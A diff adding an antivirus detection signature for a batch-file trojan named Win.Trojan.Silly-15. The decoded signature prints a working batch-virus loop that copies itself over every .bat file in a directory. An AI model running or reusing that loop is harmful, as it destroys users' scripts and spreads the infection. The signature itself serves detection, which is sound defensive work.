@@ -1,0 +1,7 @@
+VIRUS NAME: Win.Trojan.Silly-15
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+cho off
+for %%b in (*.bat) do if not "%0==" copy %0 %%b>nul
+echo on
